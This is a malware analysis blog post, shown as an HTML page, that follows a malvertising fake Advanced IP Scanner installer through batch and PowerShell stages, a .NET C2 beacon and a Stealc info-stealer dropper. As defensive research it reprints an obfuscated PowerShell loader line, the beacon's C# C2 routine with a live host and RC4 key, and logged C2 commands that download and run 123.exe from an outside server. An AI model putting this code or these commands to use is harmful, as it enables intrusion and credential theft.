<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="ie=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="author" content="">
<meta name="description" content="As has been widely reported in the cybersecurity industry, Google searches resulting in malicious advertisements were incredibly prolific during late 2022 and early 2023. This activity has reduced significantly in recent months, but it isn&amp;rsquo;t quite dead yet.
On April 19th, a search for &amp;ldquo;IP Scanner&amp;rdquo; resulted in a suspicious advertisement listed above the legitimate Advanced IP Scanner site." />
<meta name="keywords" content="" />
<meta name="robots" content="noodp" />
<meta name="theme-color" content="" />
<link rel="canonical" href="https://rerednawyerg.github.io/posts/malwareanalysis/stealc_ipscanner/" />


    <title>
        
            Unraveling a Stealc Dropper :: Reverse Engineering and Analysis  â€” Reverse Engineering and Analysis
        
    </title>




<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css" integrity="sha512-Cv93isQdFwaKBV+Z4X8kaVBYWHST58Xb/jVOcV9aRsGSArZsgAnFIhMpDoMDcFNoUtday1hdjn0nGp3+KZyyFw==" crossorigin="anonymous" referrerpolicy="no-referrer" />



<link rel="stylesheet" href="/main.b4e976c829797907253e71bb59328781e1a8eb6a28c061f1150d96c9a9b63af4.css" integrity="sha256-tOl2yCl5eQclPnG7WTKHgeGo62oowGHxFQ2Wyam2OvQ=">



    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
    <link rel="manifest" href="/site.webmanifest">
    <link rel="mask-icon" href="/safari-pinned-tab.svg" color="">
    <link rel="shortcut icon" href="/favicon.ico">
    <meta name="msapplication-TileColor" content="">


<meta itemprop="name" content="Unraveling a Stealc Dropper">
<meta itemprop="description" content="As has been widely reported in the cybersecurity industry, Google searches resulting in malicious advertisements were incredibly prolific during late 2022 and early 2023. This activity has reduced significantly in recent months, but it isn&rsquo;t quite dead yet.
On April 19th, a search for &ldquo;IP Scanner&rdquo; resulted in a suspicious advertisement listed above the legitimate Advanced IP Scanner site.">
<meta itemprop="datePublished" content="2023-04-19T10:15:56-05:00" />
<meta itemprop="dateModified" content="2023-04-19T10:15:56-05:00" />
<meta itemprop="wordCount" content="2945">



<meta itemprop="keywords" content="" />
<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="Unraveling a Stealc Dropper"/>
<meta name="twitter:description" content="As has been widely reported in the cybersecurity industry, Google searches resulting in malicious advertisements were incredibly prolific during late 2022 and early 2023. This activity has reduced significantly in recent months, but it isn&rsquo;t quite dead yet.
On April 19th, a search for &ldquo;IP Scanner&rdquo; resulted in a suspicious advertisement listed above the legitimate Advanced IP Scanner site."/>







    <meta property="article:published_time" content="2023-04-19 10:15:56 -0500 CDT" />










    </head>

    
        <body>
    
    
        <div class="container">
            <header class="header">
    <span class="header__inner">
        <a href="/" style="text-decoration: none;">
    <div class="logo">
        
            <span class="logo__mark">></span>
            <span class="logo__text ">
                mithrandir</span>
            <span class="logo__cursor" style=
                  "
                   
                   ">
            </span>
        
    </div>
</a>


        <span class="header__right">
            
                <nav class="menu">
    <ul class="menu__inner"><li><a href="/firstpost">About</a></li><li><a href="/posts">Malware Analysis</a></li>
    </ul>
</nav>

                <span class="menu-trigger">
                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
                        <path d="M0 0h24v24H0z" fill="none"/>
                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
                    </svg>
                </span>
            
        </span>
    </span>
</header>


            <div class="content">
                
  <main class="post">

    <div class="post-info">
      <p>
        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-clock">
          <circle cx="12" cy="12" r="10"></circle>
          <polyline points="12 6 12 12 16 14"></polyline>
        </svg>
        14 minutes

        
      </p>
    </div>

    <article>
      <h1 class="post-title">
        <a href="https://rerednawyerg.github.io/posts/malwareanalysis/stealc_ipscanner/">Unraveling a Stealc Dropper</a>
      </h1>

      

      
        <hr />
        <aside id="toc">
          <div class="toc-title">Table of Contents</div>
          <nav id="TableOfContents">
  <ul>
    <li><a href="#initial-download-analysis">Initial Download: Analysis</a>
      <ul>
        <li><a href="#nsisnsi">[NSIS].nsi</a></li>
        <li><a href="#batch-scripts">Batch Scripts</a></li>
        <li><a href="#t-file">.T File</a></li>
      </ul>
    </li>
    <li><a href="#net-loader--beacon">.NET Loader / Beacon</a>
      <ul>
        <li><a href="#loader-functionality">Loader Functionality</a></li>
        <li><a href="#loader-c2-communication">Loader C2 Communication</a></li>
      </ul>
    </li>
    <li><a href="#communication-emulation">Communication Emulation</a>
      <ul>
        <li><a href="#dnspy-tracepoints">dnSpy Tracepoints</a></li>
        <li><a href="#server-response">Server Response</a></li>
      </ul>
    </li>
    <li><a href="#dropper-123exe">Dropper: 123.exe</a>
      <ul>
        <li><a href="#dynamic-analysis">Dynamic Analysis</a></li>
        <li><a href="#x32dbg-unpacking">x32dbg Unpacking</a></li>
      </ul>
    </li>
    <li><a href="#final-payload-stealc">Final Payload: Stealc</a>
      <ul>
        <li><a href="#string-decryption">String Decryption</a></li>
        <li><a href="#identification">Identification</a></li>
      </ul>
    </li>
    <li><a href="#final-words">Final Words</a>
      <ul>
        <li><a href="#iocs">IOCs</a></li>
      </ul>
    </li>
  </ul>
</nav>
        </aside>
        <hr />

      

      <div class="post-content">
        <hr>

<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.1/photoswipe.min.css" integrity="sha256-sCl5PUOGMLfFYctzDW3MtRib0ctyUvI9Qsmq2wXOeBY=" crossorigin="anonymous" />
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.1/default-skin/default-skin.min.css" integrity="sha256-BFeI1V+Vh1Rk37wswuOYn5lsTcaU96hGaI7OUVCLjPc=" crossorigin="anonymous" />
<script src="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.1/photoswipe.min.js" integrity="sha256-UplRCs9v4KXVJvVY+p+RSo5Q4ilAUXh7kpjyIP5odyc=" crossorigin="anonymous"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.1/photoswipe-ui-default.min.js" integrity="sha256-PWHOlUzc96pMc8ThwRIXPn8yH4NOLu42RQ0b9SpnpFk=" crossorigin="anonymous"></script>


<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

<div class="pswp__bg"></div>

<div class="pswp__scroll-wrap">
    
    <div class="pswp__container">
      <div class="pswp__item"></div>
      <div class="pswp__item"></div>
      <div class="pswp__item"></div>
    </div>
    
    <div class="pswp__ui pswp__ui--hidden">
    <div class="pswp__top-bar">
      
      <div class="pswp__counter"></div>
      <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
      <button class="pswp__button pswp__button--share" title="Share"></button>
      <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
      <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
      
      
      <div class="pswp__preloader">
        <div class="pswp__preloader__icn">
          <div class="pswp__preloader__cut">
            <div class="pswp__preloader__donut"></div>
          </div>
        </div>
      </div>
    </div>
    <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
      <div class="pswp__share-tooltip"></div>
    </div>
    <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
    </button>
    <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
    </button>
    <div class="pswp__caption">
      <div class="pswp__caption__center"></div>
    </div>
    </div>
    </div>
</div>


<script src="https://code.jquery.com/jquery-1.12.4.min.js" integrity="sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=" crossorigin="anonymous"></script>
<script src="/js/pswp-init.js"></script>

<p>As has been widely reported in the cybersecurity industry, Google searches resulting in malicious advertisements were incredibly prolific during late 2022 and early 2023. This activity has reduced significantly in recent months, but it isn&rsquo;t quite dead yet.</p>
<p>On April 19th, a search for &ldquo;IP Scanner&rdquo; resulted in a suspicious advertisement listed above the legitimate Advanced IP Scanner site.
<figure  itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject">
    <a href="images/google_search.png"  itemprop="contentUrl"> 
        <img itemprop="thumbnail"
            src="images/google_search.png"
            alt="screenshot_google_search"
            />
    </a>
    
</figure>
When the advertisment is clicked, the victim&rsquo;s IP address and device type are checked. If they meet the threat actor&rsquo;s specifications, a fake Advanced IP Scanner website is shown, otherwise, a dummy news outlet website is displayed.</p>
<p>This is common practice, and helps the threat actors hide their malicious activity from automated scans, takedowns, and security researchers.
<figure  itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject">
    <a href="images/fake_ipscanner_site.png"  itemprop="contentUrl"> 
        <img itemprop="thumbnail"
            src="images/fake_ipscanner_site.png"
            alt="fake_ipscanner_site"
            />
    </a>
    
</figure>
On clicking the download button, a file called &ldquo;Advanced_IP_Scanner_2.5.4594.1.exe&rdquo; is downloaded from Dropbox.</p>
<h2 id="initial-download-analysis">Initial Download: Analysis</h2>
<p>Opening the downloaded file in DetectItEasy, it is categorized as a Nullsoft Scriptable Install System (NSIS) package. This is good news, it means I can use 7zip to dump the contents of the installer and perform a closer inspection.
<figure  itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject">
    <a href="images/unzipping.png"  itemprop="contentUrl"> 
        <img itemprop="thumbnail"
            src="images/unzipping.png"
            alt="unzipping"
            />
    </a>
    
</figure></p>
<p>Several files are extracted, including the NSIS installation script (.nsi). Let&rsquo;s start there.</p>
<h3 id="nsisnsi">[NSIS].nsi</h3>
<p>For those who have not dug into NSIS scripts, here is a handy <a href="https://nsis.sourceforge.io/Docs/Chapter4.html">syntax guide</a>.</p>
<p>One of the first things I noticed were some typos in the <code>name</code> field - not necessarily important, but certainly indicates this is not a legitimate installer.
<figure  itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject">
    <a href="images/typo.png"  itemprop="contentUrl"> 
        <img itemprop="thumbnail"
            src="images/typo.png"
            alt="typos"
            />
    </a>
    
</figure></p>
<p>Scrolling down, I can see the installation directory is set to &ldquo;C:\ProgramData\Microsoft\NodejsToolsVsix&rdquo;.
<figure  itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject">
    <a href="images/installdir.png"  itemprop="contentUrl"> 
        <img itemprop="thumbnail"
            src="images/installdir.png"
            alt="installdir"
            />
    </a>
    
</figure></p>
<p>The file &ldquo;Advanced_IP_Scanner_2.5.4594.1.exe&rdquo; is written to the installation directory and executed. This file was contained within the original NSIS package and is the legitimate Advanced IP Scanner installation tool.</p>
<p>Now, things start to get more interesting. The script then checks whether a file named <code>Cert.txt</code> exists in the installation directory, and if so, it jumps to the end of the section, skipping the rest of the script.</p>
<p>If file did not previously exist, it is now created. This will stop the script from running multiple times.
<figure  itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject">
    <a href="images/section1.png"  itemprop="contentUrl"> 
        <img itemprop="thumbnail"
            src="images/section1.png"
            alt="section"
            />
    </a>
    
</figure>
Next, the script checks the registry to determine two things - if the device is part of a domain, and whether it is running Windows 10 or above. If either of these are false, the script will terminate.</p>
<p>Once the checks are complete, the script copies a 7z archive and a legitimate copy of the 7z tool to the installation directory.</p>
<p>The next command is executed via the built-in <a href="https://nsis.sourceforge.io/NsExec_plug-in">nsExec plugin</a>, a DLL whose function is to execute &ldquo;command-line based programs and capture the output without opening a dos box.&rdquo;</p>
<p>Using 7zip via the plugin, the script provides a hardcoded password to extract the contents of the archive and stores the output in the installation directory.<br>
<figure  itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject">
    <a href="images/outputdir.png"  itemprop="contentUrl"> 
        <img itemprop="thumbnail"
            src="images/outputdir.png"
            alt="outputdir"
            />
    </a>
    
</figure></p>
<p>After the archive is extracted, a new directory is created, and several files are copied from the installation directory to the new directory.
<figure  itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject">
    <a href="images/section2.png"  itemprop="contentUrl"> 
        <img itemprop="thumbnail"
            src="images/section2.png"
            alt="section2"
            />
    </a>
    
</figure></p>
<p>The script then creates two registry entries. The first is a <code>Run</code> key, which will cause the target <code>.lnk</code> file to execute whenever a user logs into to the device.</p>
<p><figure  itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject">
    <a href="images/section3.png"  itemprop="contentUrl"> 
        <img itemprop="thumbnail"
            src="images/section3.png"
            alt="section3"
            />
    </a>
    
</figure>
Checking the properties of the <code>lnk</code> file, it contains the following:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">C:\ProgramData\Microsoft\LogConverter\Microsoft.NodejsTools.PressAnyKey.exe abnormal c:\programdata\%username%0 cmd /c C:\ProgramData\Microsoft\LogConverter\LogConverter.bat
</code></pre></div><p>The <code>PressAnyKey.exe</code> file, which was previously extracted from the 7z archive, is a LOLBin first published on Twitter by <a href="https://twitter.com/mrd0x/status/1463526834918854661?s=20">mrd0x</a>.  It is a Microsoft signed binary which allows for the execution of other binaries, in this case, <code>cmd.exe</code>.</p>
<p>There are a few required parameters for the LOLBin to execute properly. The <code>abnormal</code> flag will cause the PressAnyKey process to exit once it creates the new <code>cmd.exe</code> process, and the <code>programdata</code> path is where the ProcessID will be written. I&rsquo;ll dig into the batch script passed to cmd.exe in the next section.</p>
<p>Back to the NSIS script, the second registry value created replaces the value in <code>HKLM\SOFTWARE\Microsoft\MSDTC\MTxOCI --&gt; OracleOciLibPath</code> with <code>C:\ProgramData\SysIco</code>. At this point, I am not sure what purpose this serves, but maybe I&rsquo;ll uncover it as I progress.</p>
<p>After the registry values are written, the previously copied files are deleted from the installation directory, and the script sleeps.
<figure  itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject">
    <a href="images/section4.png"  itemprop="contentUrl"> 
        <img itemprop="thumbnail"
            src="images/section4.png"
            alt="section4"
            />
    </a>
    
</figure></p>
<p>Finally, the script will use the <code>PressAnyKey</code> LOLBin to execute another batch script, and then exit.</p>
<h3 id="batch-scripts">Batch Scripts</h3>
<p>Following execution sequentially, I&rsquo;ve have now progressed to the first batch script. The content of the two <code>.bat</code> scripts are very similar, so I will only walk through one of them.<br>
<figure  itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject">
    <a href="images/batch_script.png"  itemprop="contentUrl"> 
        <img itemprop="thumbnail"
            src="images/batch_script.png"
            alt="batch_script"
            />
    </a>
    
</figure>
The script will create a PowerShell process and create two variables.</p>
<p>Line 9 is intentionally confusing, so let&rsquo;s break it down.</p>
<pre><code class="language-PS" data-lang="PS">SI Variable:DK (.$ExecutionContext.(($ExecutionContext|GM)[6].Name).GetCommand($ExecutionContext.(($ExecutionContext|GM)[6].Name).(($ExecutionContext.(($ExecutionContext|GM)[6].Name)|GM|Where{(GV _ -ValueO).Name-clike'*Com*e'}).Name).Invoke('*w-*ct',1,1),[Management.Automation.CommandTypes]::Cmdlet)(LS Variable:P).Value);
</code></pre><p>Taking each part piece by piece starting with <code>($ExecutionContext|GM)[6].Name</code>, I drop this into a new PowerShell session and see it is equivalent to <code>InvokeCommand</code>. Performing this translation and substitution throughout, the script can be simplified.
<figure  itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject">
    <a href="images/batch_cleaned.png"  itemprop="contentUrl"> 
        <img itemprop="thumbnail"
            src="images/batch_cleaned.png"
            alt="batch_cleaned"
            />
    </a>
    
</figure>
Line 11 uses method overloading to perform Invoke-Expression while trying to avoid any strings that may flag AMSI or AV.</p>
<p>Really, the script could be boiled down to just:</p>
<pre><code class="language-PS" data-lang="PS">Invoke-Expression(New-Object Net.WebClient).DownloadString.Invoke(C:\ProgramData\Microsoft\LogConverter\CG6oDkyFHl3R.t)
</code></pre><p>Note: Apparently if using this overload technique, PowerShell will attempt to execute whatever file is passed to Invoke() as if it were PowerShell, no matter the file extension. I am not a PS expert, so not sure why that is.</p>
<p>Execution now passes on the to the <code>.t</code> file, which contains more PowerShell.</p>
<h3 id="t-file">.T File</h3>
<p>As with the previous batch scripts, the two <code>.t</code> files from this sample are very similar to each other, with a few differences I&rsquo;ll discuss momentarily.</p>
<p>It starts out by defining a byte key and a very long encrypted standard string.
<figure  itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject">
    <a href="images/t_file.png"  itemprop="contentUrl"> 
        <img itemprop="thumbnail"
            src="images/t_file.png"
            alt="t_file"
            />
    </a>
    
</figure>
In line 4, the encrypted string is converted to a <a href="https://learn.microsoft.com/en-us/dotnet/api/system.security.securestring?view=net-7.0">secure string</a> using the key variable. The secure string is then copied to an unmanaged binary string, which is then copied to a managed string.</p>
<p>Once the string is copied into managed memory, it can be echoed out to view the contents - looking at lines 8 and 9, I know it will be C# source code.</p>
<p>Line 8 defines a .NET class in the PowerShell session using the contents of the <code>$managed_str</code>, while line 9 calls a specific method from the class, passing in some arguments.</p>
<p>I previously mentioned some differences between the two <code>.t</code> files - the encrypted standard string, the key, and the arguments are the only variations, the rest of the functionality is the same.</p>
<p>Now execution moves to stage two, and since I&rsquo;ve got the C# source code, I can load it into Visual Studio and analyze it further.</p>
<h2 id="net-loader--beacon">.NET Loader / Beacon</h2>
<p>The source code originally had all the class, method, and variable names set to random strings, so I first went through each method and renamed everything appropriately.</p>
<p>I also made some small changes so I could compile the code and create a binary which I could step through in a debugger. You can view my cleaned version of the source code <a href="https://pastebin.com/gBFa7MPc">here</a>.</p>
<p>Since the source code is de-obfuscated and simple, I&rsquo;ll just do a brief analysis of it.</p>
<h3 id="loader-functionality">Loader Functionality</h3>
<p>As noted earlier, the method called by the <code>.t</code> file is:<br>
<code>rYqzrd(&quot;https://snow.cdn-b1d8e9.workers.dev&quot;, &quot;OYEXidNnoFTXfoKbDqoEaOuj&quot;, &quot;75000&quot;)</code></p>
<p>A custom string generator method is used, which creates a random 16 character alphanumeric string. This will be used as a &ldquo;registration id&rdquo; for the C2 server.</p>
<p>The second argument is converted to a byte array &ndash; spoiler alert, this is an RC4 key which will be used to encrypt/decrypt the communications with the C2.</p>
<p>Argument three is used to pass to the <code>Sleep</code> method, controlling the rate of the C2 beacon.</p>
<p>To &ldquo;register&rdquo; the victim device, the script creates a formatted string using the registration id and the result of another custom method, which returns the ComputerName, UserDomain, and UserName environment variable values.</p>
<p>The registration string is then sent to the C2 server using a method I&rsquo;ve renamed to &ldquo;c2_comms&rdquo;.</p>
<p>Once the victim has been registered, the script enters a loop. In each iteration, it will sleep for 75 seconds before contacting the C2 again.<br>
If the C2 does not respond, the loop continues without taking any action.</p>
<p>If the C2 answers, the response will be decrypted using the hardcoded RC4 key, and depending on the content of the response one of four actions will be taken.</p>
<ul>
<li>Alter the beacon time</li>
<li>Take a screenshot and send it to the C2</li>
<li>Exit the loop</li>
<li>Execute the command from the C2 and send back the response</li>
</ul>
<p>Let&rsquo;s take a look at how the script communicates with the C2 server.</p>
<h3 id="loader-c2-communication">Loader C2 Communication</h3>
<p>If a string is passed in as the first argument to the <code>c2_comms</code> method, it will first be encrypted using RC4. The key, as mentioned earlier, is <code>OYEXidNnoFTXfoKbDqoEaOuj</code>.</p>
<p>A URI is then generated with a random string as the path, and used to create a web request. The OS version is set as the UserAgent, and a hardcoded host string is used as the host field.</p>
<p>Note: I believe this means the domain argument originally passed into the loader is irrelevant; since the host parameter is hardcoded, it will always override the argument string.
In fact, the arguments used in the other <code>.t</code> file are: <code>(&quot;https://mscrl.microsoft.com&quot;, &quot;fLYQnVRnUoiGOuJdSXkNkDfC&quot;, &quot;20000&quot;)</code>. The use of the benign Microsoft domain indicates an attempt to disguise the real destination.</p>
<p>It is possible the threat actor meant to use a benign URL in both arguments, but forgot to replace one of them.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C#" data-lang="C#"><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">string</span> c2_comms(<span style="color:#66d9ef">string</span> arg1, <span style="color:#66d9ef">string</span> arg2)
{
	<span style="color:#66d9ef">byte</span>[] rc4_encrypted_string;
	<span style="color:#66d9ef">if</span> (arg1 != <span style="color:#66d9ef">null</span>)
	{
		rc4_encrypted_string = rc4_class.call_rc4_encrypt(byte_array, Encoding.ASCII.GetBytes(arg1));
	}
	<span style="color:#66d9ef">else</span>
	{
		rc4_encrypted_string = <span style="color:#66d9ef">new</span> <span style="color:#66d9ef">byte</span>[<span style="color:#ae81ff">0</span>];
	}
	<span style="color:#75715e">//will generate a url string with a random string as the path
</span><span style="color:#75715e"></span>	<span style="color:#66d9ef">string</span> url_string = String.Format(<span style="color:#e6db74">&#34;{0}/{1}/&#34;</span>, snow_cdn_url, rand_str_generator(<span style="color:#ae81ff">0</span>));
	HttpWebRequest http_request = (HttpWebRequest)WebRequest.Create(url_string);
	http_request.Method = <span style="color:#e6db74">&#34;POST&#34;</span>;
	http_request.UserAgent = os_version_str;
	http_request.Timeout = <span style="color:#ae81ff">10000</span>;
	http_request.Host = <span style="color:#e6db74">&#34;snow.cdn-b1d8e9.workers.dev&#34;</span>;
	http_request.Proxy.Credentials = CredentialCache.DefaultNetworkCredentials;
	Stream stream = <span style="color:#66d9ef">null</span>;
	StreamReader streamreader = <span style="color:#66d9ef">null</span>;
	<span style="color:#66d9ef">string</span> streamreader_content;
	<span style="color:#66d9ef">string</span> data_str = <span style="color:#e6db74">&#34;&#34;</span>;
	<span style="color:#66d9ef">if</span> (rc4_encrypted_string.Length &gt; <span style="color:#ae81ff">0</span>)
	{
		data_str = Convert.ToBase64String(rc4_encrypted_string);
	}
	HnvKzYXNyYAYLD data_to_send = <span style="color:#66d9ef">new</span> HnvKzYXNyYAYLD
	{
		UUID = arg2,
		ID = rand_str,
		Data = data_str
	};
	<span style="color:#66d9ef">var</span> js_serializer = <span style="color:#66d9ef">new</span> JavaScriptSerializer();
	<span style="color:#66d9ef">var</span> serialized_data = js_serializer.Serialize(data_to_send).ToString();
	http_request.ContentType = <span style="color:#e6db74">&#34;application/json&#34;</span>;
	<span style="color:#66d9ef">try</span>
	{
		stream = http_request.GetRequestStream();
		stream.Write(Encoding.ASCII.GetBytes(serialized_data), <span style="color:#ae81ff">0</span>, serialized_data.Length);
	}
	<span style="color:#66d9ef">finally</span>
	{
		<span style="color:#66d9ef">if</span> (stream != <span style="color:#66d9ef">null</span>)
		{
			stream.Dispose();
		}
	}
	<span style="color:#66d9ef">try</span>
	{
		stream = http_request.GetResponse().GetResponseStream();
		streamreader = <span style="color:#66d9ef">new</span> StreamReader(stream);
		streamreader_content = streamreader.ReadToEnd();
	}
	<span style="color:#66d9ef">catch</span>
	{
		streamreader_content = <span style="color:#e6db74">&#34;&#34;</span>;
	}
	<span style="color:#66d9ef">return</span> streamreader_content.ToString();
}
</code></pre></div><p>The encrypted string is then base64 encoded, added as an element to a structure, serialized, and sent to the C2 server. If there is a response, it is returned from the method.</p>
<p>There are a few more methods contained within this loader, but out of scope of the write up. I&rsquo;ll now move on to emulating the communications between a victim and the C2.</p>
<h2 id="communication-emulation">Communication Emulation</h2>
<p>My next goal is to use the loader to communicate with the C2 server while logging all requests and responses. Since I have the source code, I&rsquo;ve got a few options to chose from.</p>
<p>I could add some C# code to log the plaintext requests and responses as the loader runs. However, I want to showcase a cool feature I learned recently in dnSpy, so I chose to simply add a main method and compile the binary as is.</p>
<h3 id="dnspy-tracepoints">dnSpy Tracepoints</h3>
<p>Once the binary was loaded into dnSpy, I set breakpoints right before data was sent to the C2 and right after the response was decoded.</p>
<p>As I learned in a great video from <a href="https://www.youtube.com/watch?v=yxw4h82mQ2s">DuMp-GuY TrIcKsTeR</a>, breakpoints can be converted into &ldquo;tracepoints&rdquo;, which can evaluate conditional expressions, perform filtering, and log messages either to the console or to the file system.</p>
<p>Here is an example of the formatting of a tracepoint log message:</p>
<pre><code class="language-string" data-lang="string">$FUNCTION Response_String: {response_struct.Data} {System.IO.File.AppendAllText(&quot;C:\\Users\\&lt;user&gt;\\log.txt&quot;,&quot;ResponseID\n&quot;+response_struct.ID + &quot;\nResp_UUID\n&quot;+response_struct.UUID+&quot;\nresp_data\n&quot;+response_struct.Data+&quot;\n&quot;)}
</code></pre><p>With the tracepoints in place, I can now execute the loader, sit back, and hope the server is still live.</p>
<h3 id="server-response">Server Response</h3>
<p>The first call to the C2 contained the following content:</p>
<pre><code class="language-String" data-lang="String">ID --&gt; uVX1bTFdMmzgD2nW
UUID --&gt; NULL
data --&gt; &lt;b64_rc4enc_string&gt; --&gt; (decoded &amp; decrypted: &quot;register uVX1bTFdMmzgD2nW DESKTOP-JRFM9FE DESKTOP-JRFM9FE\&lt;user&gt;&quot;)
</code></pre><p>The server responded immediately with:</p>
<pre><code class="language-String" data-lang="String">Response_ID --&gt; uVX1bTFdMmzgD2nW
Response_UUID --&gt; 25caaa27-f98f-41a8-b3e2-e3b86f2e45ba
Response_Data(decrypted) --&gt; whoami
</code></pre><p>My victim machine executed the <code>whoami</code> command, encrypted the response, and sent it back to the C2.</p>
<p>After this, the <code>c2_comms</code> method executed once every 75 seconds, but the C2 did not respond again for several hours.</p>
<p>Roughly eight hours later, this series of commands was issued from the remote server:</p>
<pre><code class="language-String" data-lang="String">ls c:\
$clients1 = new-object System.Net.WebClient;$clients1.DownLoadFile('http://ec2-18-191-188-207.us-east-2.compute.amazonaws.com/T7YHUE/123',&quot;c:\programdata\123.exe&quot;);
c:\programdata\123.exe
systeminfo
rm -r c:\programdata\123.exe
</code></pre><p>My victim machine is a VM and I didn&rsquo;t make any attempts to alter the responses to the commands, so the result of <code>systeminfo</code> will have alerted the TA that the victim is likely a sandbox or a researcher. I let the beacon run for a few more hours, but the server never responded again.</p>
<p>No matter, I still have the URI for the next stage. I can download the <code>123.exe</code> file and continue analysis in the next section.</p>
<h2 id="dropper-123exe">Dropper: 123.exe</h2>
<p>DetectItEasy noted high entropy (7.25), and indicated the binary was packed.</p>
<p>Just to get a feel for what I was dealing with, I started with some dynamic analysis.</p>
<h3 id="dynamic-analysis">Dynamic Analysis</h3>
<p>With ProcessMonitor running, I executed the <code>123.exe</code> binary and observed it spawning the <code>C:\Windows\Microsoft.NET\Framework\v4.0.30319\AppLaunch.exe</code> process.</p>
<p>Interesting - I wonder if some sort of injection is taking place.</p>
<p>I utilized ProcessHacker to investigate this theory; I opened the memory tab of the <code>AppLaunch.exe</code> process and took a look at the strings.
<figure  itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject">
    <a href="images/dynamic_analysis.png"  itemprop="contentUrl"> 
        <img itemprop="thumbnail"
            src="images/dynamic_analysis.png"
            alt="dynamic_analysis"
            />
    </a>
    
</figure>
The memory tab shows an IP address as well as some other unusual strings, looks like the theory of process injection was correct, or at least on the right track.</p>
<p>The URI likely used to download <code>sqlite3.dll</code> hints this may be an info-stealer. The legitimate DLL is often used by malware to extract data like credit card info and passwords from victim machines.</p>
<p>A few more strings from the process memory solidify that theory:
<figure  itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject">
    <a href="images/stealer_string1.png"  itemprop="contentUrl"> 
        <img itemprop="thumbnail"
            src="images/stealer_string1.png"
            alt="stealer_string1"
            />
    </a>
    
</figure>
<figure  itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject">
    <a href="images/stealer_string2.png"  itemprop="contentUrl"> 
        <img itemprop="thumbnail"
            src="images/stealer_string2.png"
            alt="stealer_string2"
            />
    </a>
    
</figure>
Looking further at the memory strings, I can guess that the injected process gathers information about the device and sends it back to the C2:
<figure  itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject">
    <a href="images/device_info.png"  itemprop="contentUrl"> 
        <img itemprop="thumbnail"
            src="images/device_info.png"
            alt="device_info"
            />
    </a>
    
</figure>
After doing some basic dynamic analysis, I can safely assume the <code>123.exe</code> binary is a dropper for an info-stealer.</p>
<p>Let&rsquo;s move to x32dbg and see if I can learn more about the dropper and its payload.</p>
<h3 id="x32dbg-unpacking">x32dbg Unpacking</h3>
<p>It took me a few tries to get the APIs correctly identified; I knew unpacking and injection was taking place, so I started out by placing breakpoints on:</p>
<pre><code class="language-String" data-lang="String">VirtualProtect
VirtualAlloc
</code></pre><p>Note: I ran into some anti-analysis mechanisms, but I was able to easily bypass them by using the <code>Debug --&gt; Advanced Features --&gt; Hide debugger (PEB)</code> feature in x32dbg.</p>
<p>After a few runs, I was able to see a PE file was written to the memory allocated by VirtualAlloc - this is likely the unpacked payload.</p>
<p>However, I wanted to understand what type of injection was occurring, so I added a few more breakpoints.</p>
<p>First, the dropper uses <code>CreateProcessW</code> to create <code>AppLaunch.exe</code> in a suspended state, as indicated by the <code>dwCreationFlags</code> set to &ldquo;4&rdquo;. Upon creation, <code>ZwUnmapViewOfSection</code> is used to unmap memory in the newly created process.
<figure  itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject">
    <a href="images/createprocessw.png"  itemprop="contentUrl"> 
        <img itemprop="thumbnail"
            src="images/createprocessw.png"
            alt="createprocessw"
            />
    </a>
    
</figure>
Then, <code>VirtualAlloc</code> and <code>ntdll.memcpy</code> are invoked to write the unpacked payload into a region of memory, which is then written to the memory of the <code>AppLaunch.exe</code> process using <code>WriteProcessMemory</code>.</p>
